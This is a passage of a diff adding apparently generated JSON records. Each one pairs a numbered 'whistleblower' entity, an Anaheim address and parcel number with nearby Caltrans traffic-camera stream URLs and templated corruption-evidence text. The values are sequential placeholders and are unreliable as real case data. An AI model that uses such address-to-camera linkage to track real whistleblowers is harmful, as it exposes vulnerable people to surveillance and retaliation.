+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #41 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0594",
+      "entity_name": "WHISTLEBLOWER 042",
+      "address": "1042 EAST BALL ROAD SUITE 2, ANAHEIM, CA",
+      "apn": "178-431-42",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #42 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0595",
+      "entity_name": "WHISTLEBLOWER 043",
+      "address": "1043 EAST BALL ROAD SUITE 3, ANAHEIM, CA",
+      "apn": "178-431-43",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #43 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0596",
+      "entity_name": "WHISTLEBLOWER 044",
+      "address": "1044 EAST BALL ROAD SUITE 4, ANAHEIM, CA",
+      "apn": "178-431-44",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #44 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0597",
+      "entity_name": "WHISTLEBLOWER 045",
+      "address": "1045 EAST BALL ROAD SUITE 5, ANAHEIM, CA",
+      "apn": "178-431-45",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #45 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0598",
+      "entity_name": "WHISTLEBLOWER 046",
+      "address": "1046 EAST BALL ROAD SUITE 6, ANAHEIM, CA",
+      "apn": "178-431-46",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #46 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0599",
+      "entity_name": "WHISTLEBLOWER 047",
+      "address": "1047 EAST BALL ROAD SUITE 7, ANAHEIM, CA",
+      "apn": "178-431-47",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #47 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0600",
+      "entity_name": "WHISTLEBLOWER 048",
+      "address": "1048 EAST BALL ROAD SUITE 8, ANAHEIM, CA",
+      "apn": "178-431-48",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #48 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0601",
+      "entity_name": "WHISTLEBLOWER 049",
+      "address": "1049 EAST BALL ROAD SUITE 9, ANAHEIM, CA",
+      "apn": "178-431-49",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #49 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0602",
+      "entity_name": "WHISTLEBLOWER 050",
+      "address": "1050 EAST BALL ROAD SUITE 0, ANAHEIM, CA",
+      "apn": "178-431-50",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #50 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0603",
+      "entity_name": "WHISTLEBLOWER 051",
+      "address": "1051 EAST BALL ROAD SUITE 1, ANAHEIM, CA",
+      "apn": "178-431-51",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #51 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0604",
+      "entity_name": "WHISTLEBLOWER 052",
+      "address": "1052 EAST BALL ROAD SUITE 2, ANAHEIM, CA",
+      "apn": "178-431-52",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #52 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0605",
+      "entity_name": "WHISTLEBLOWER 053",
+      "address": "1053 EAST BALL ROAD SUITE 3, ANAHEIM, CA",
+      "apn": "178-431-53",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #53 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0606",
+      "entity_name": "WHISTLEBLOWER 054",
+      "address": "1054 EAST BALL ROAD SUITE 4, ANAHEIM, CA",
+      "apn": "178-431-54",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #54 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0607",
+      "entity_name": "WHISTLEBLOWER 055",
+      "address": "1055 EAST BALL ROAD SUITE 5, ANAHEIM, CA",
+      "apn": "178-431-55",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #55 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0608",
+      "entity_name": "WHISTLEBLOWER 056",
+      "address": "1056 EAST BALL ROAD SUITE 6, ANAHEIM, CA",
+      "apn": "178-431-56",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #56 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0609",
+      "entity_name": "WHISTLEBLOWER 057",
+      "address": "1057 EAST BALL ROAD SUITE 7, ANAHEIM, CA",
+      "apn": "178-431-57",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #57 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0610",
+      "entity_name": "WHISTLEBLOWER 058",
+      "address": "1058 EAST BALL ROAD SUITE 8, ANAHEIM, CA",
+      "apn": "178-431-58",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #58 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0611",
+      "entity_name": "WHISTLEBLOWER 059",
+      "address": "1059 EAST BALL ROAD SUITE 9, ANAHEIM, CA",
